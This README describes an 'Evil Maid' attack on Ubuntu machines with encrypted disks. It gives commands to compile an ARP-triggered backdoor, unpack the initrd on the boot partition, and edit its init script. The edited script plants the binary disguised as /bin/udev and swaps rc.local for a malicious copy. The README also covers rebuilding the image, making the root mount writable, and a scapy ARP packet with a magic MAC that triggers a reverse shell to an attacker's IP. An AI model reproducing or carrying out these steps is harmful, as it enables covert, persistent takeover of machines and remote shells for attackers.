# EvilMaid Attack implementation

This EvilMaid implementation is for those machines with Ubuntu and encrypted disk instalations

NOTE: I will describe all this process better, but give me a while.

# How to compile arp_knocking.cpp

First, you'll need to download and compile libtins from Martias Fontanini repo, [here](https://github.com/mfontanini/libtins).
Then run these lines to compile the program changing what you need to make It reference the library correctly.

g++ -static arp_knocking.c -o arp_knocking -std=c++11 -L ../libtins/build/lib/ -I ../libtins/include/ -lpthread -ltins -lpcap

g++ -static arp_knocking.cpp -o arp_knocking -std=c++11 -L ../libtins/build/lib/ -I ../libtins/include/ -ltins -lpcap -Wl,--whole-archive -lpthread -Wl,--no-whole-archive

# How to inject our binary in a initrd image

## mount boot partion
    mount /dev/sda1 /mnt

we will work under /tmp/ now

    cd /tmp/
    mkdir mn

## make a backup, just in case
    cp /mnt/initrd.img-X /mnt/initrd.img-X.old

## make a local copy of initrd.img to work over it
    cp /mnt/initrd.img-X ./initrd.img.gz
    gzip -d initrd.img.gz
    cd mn
    cpio -id < ../initrd.img

## edit ./mn/init file with ...

Here we will add all these lines to init script to make they run during booting process.

    cp ./arp_knocking ${rootmnt}/bin/udev
    chmod a+x ${rootmnt}/bin/udev
    cp ${rootmnt}/etc/rc.local ${rootmnt}/etc/rc.local.old
    cp rc.local.mal ${rootmnt}/etc/rc.local
    chmod a+x ${rootmnt}/etc/rc.local

## rebuild initrd.img

    find . | cpio -o -H newc > ../initrd.img
    gzip initrd.img
    mv initrd.img.gz /mnt/initrd.img-...

## finally

change /mnt/grub/grub.cfg ocurrencies of "ro" with "rw"

## triggering

to trigger the reverse shell we'll send a ARP request to out target telling it the IP where we are listing for reverse shell (psrc) and the "magic MAC" that is "fa:fa:fa:fa:fa:fa". For this we were using __scapy__, like this

    send(ARP(op="who-has", psrc="192.168.2.55", pdst="192.168.2.99", hwsrc="fa:fa:fa:fa:fa:fa", hwdst="ff:ff:ff:ff:ff:ff")))